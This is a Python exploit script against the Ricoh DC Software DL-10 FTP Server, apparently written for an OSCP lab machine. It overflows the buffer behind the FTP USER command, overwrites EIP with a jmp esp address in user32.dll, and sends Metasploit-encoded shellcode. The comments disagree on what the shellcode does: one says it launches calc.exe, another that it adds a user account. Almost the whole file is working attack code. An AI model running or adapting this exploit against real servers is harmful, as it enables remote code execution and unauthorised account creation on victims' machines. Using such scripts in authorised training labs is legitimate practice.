#!/usr/bin/python
  
# Exploit Title: Ricoh DC Software DL-10 FTP Server (SR10.exe) <= 1.1.0.6 Remote Buffer Overflow Vulnerability
# Version:       <= 1.1.0.6
# Author: Je
# Target: OSCP
 
import socket,sys
import os
 
target="192.168.24.227"
port=21
 
junk = "\x41" * 245
eip = "\x38\x07\xD2\x77"; #0x77D20738 #jmp esp from user32.dll
nops = "\x90" * 16
 
# windows/exec CMD=calc.exe
# Encoder: x86/shikata_ga_nai
# powered by Metasploit
# msfpayload windows/adduser USER=alex PASS=Alex@1234 R | msfencode -b '\x00\x0a\x0d'
 
shellcode = ("\xda\xc3\xd9\x74\x24\xf4\x5f\xbd\xd5\x93\x90\xe7\x31\xc9" +
"\xb1\x45\x31\x6f\x19\x03\x6f\x19\x83\xc7\x04\x37\x66\x6c" +
"\x0f\x3e\x89\x8d\xd0\x20\x03\x68\xe1\x72\x77\xf8\x50\x42" +
"\xf3\xac\x58\x29\x51\x45\xea\x5f\x7e\x6a\x5b\xd5\x58\x45" +
"\x5c\xd8\x64\x09\x9e\x7b\x19\x50\xf3\x5b\x20\x9b\x06\x9a" +
"\x65\xc6\xe9\xce\x3e\x8c\x58\xfe\x4b\xd0\x60\xff\x9b\x5e" +
"\xd8\x87\x9e\xa1\xad\x3d\xa0\xf1\x1e\x4a\xea\xe9\x15\x14" +
"\xcb\x08\xf9\x47\x37\x42\x76\xb3\xc3\x55\x5e\x8a\x2c\x64" +
"\x9e\x40\x13\x48\x13\x99\x53\x6f\xcc\xec\xaf\x93\x71\xf6" +
"\x6b\xe9\xad\x73\x6e\x49\x25\x23\x4a\x6b\xea\xb5\x19\x67" +
"\x47\xb2\x46\x64\x56\x17\xfd\x90\xd3\x96\xd2\x10\xa7\xbc" +
"\xf6\x79\x73\xdd\xaf\x27\xd2\xe2\xb0\x80\x8b\x46\xba\x23" +
"\xdf\xf0\xe1\x29\x1e\x71\x9c\x17\x20\x89\x9f\x37\x49\xb8" +
"\x14\xd8\x0e\x45\xff\x9c\xe1\x0c\xa2\xb5\x69\xc8\x36\x84" +
"\xf7\xeb\xec\xcb\x01\x6f\x05\xb4\xf5\x6f\x6c\xb1\xb2\x28" +
"\x9c\xcb\xab\xdc\xa2\x78\xcb\xf5\xc0\x13\x57\xdb\x63\x94" +
"\xf2\x03\x43\x07\xdd\x2d\xfe\xb3\x3d\xc4\x73\x59\x4c\x06" +
"\x15\xcd\xd5\x3e\xf5\x4c\x7a\xdb\x8d\x0e\xb3\x11\x5d\xbb" +
"\x93\x7a\xe0\x87\x97\xa4\xc4\x21\x38\xca\x6d\x5a\x18\x7e" +
"\x01\xc1\x39\x12\xba\x77\xd5\x9f\x34\x58\x68\x3b\xd8\xf1" +
"\x04\xaa\x51\x76\xab\x4d\xe2\x19\x39\xfe\x2a\x87\xd1\x65" +
"\x53\x67\x05\x24\xe7\x23\x59")
 
payload = junk + eip + nops + shellcode
 
print "[*] Connecting to Target " + target + "..."
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((target, port))
    print "[*] Connected to " + target + "!"
except:
    print "[!] " + target + " didn't respond\n"
    sys.exit(0)
 
s.recv(1024)
print "[*] Sending malformed request..."
s.send('USER ' + payload + '\r\n')
 
print "[!] Exploit has been sent!\n"
s.close()